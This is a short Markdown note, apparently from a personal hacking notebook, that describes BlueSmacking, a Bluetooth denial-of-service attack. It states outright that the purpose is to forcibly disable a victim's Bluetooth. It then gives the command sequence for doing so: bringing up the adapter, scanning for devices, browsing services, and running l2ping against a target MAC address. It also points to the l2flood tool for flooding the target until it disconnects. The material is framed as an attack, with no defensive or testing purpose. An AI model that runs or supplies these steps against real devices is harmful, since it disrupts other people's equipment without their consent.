---
Author: Sumit Kumar
Email: ravirajkarn21@gmail.com
Date Created: 2025-09-18 15:19::24 PM
tags:
  - Linux
  - bluetooth
  - hacking
  - wireless
  - command
  - DoS_attack
---

# BlueSmacking
## What is BlueSmacking?

BlueSmacking is a type of Denial of Service ([DoS](DoS%20Attack.md)) attack that targets Bluetooth-enabled devices. It exploits vulnerabilities in the Bluetooth protocol to overwhelm the target device with a flood of connection requests, ultimately causing it to become unresponsive or crash.

## Use
1. when you want to turn off bluetooth of victim forcefully. 

## How to BlueSmacking?

```
hciconfig -a
```

```
hciconfig hci0 up
```

```
hcitool scan
```

```
hcitool inq
```

```
sdptool browse <MAC>
```

```
l2ping <MAC>
```

## Useful tool
1.  [l2flood](l2flood.md) : Flood a given bluetooth device with ping requests in order to force it to disconnect.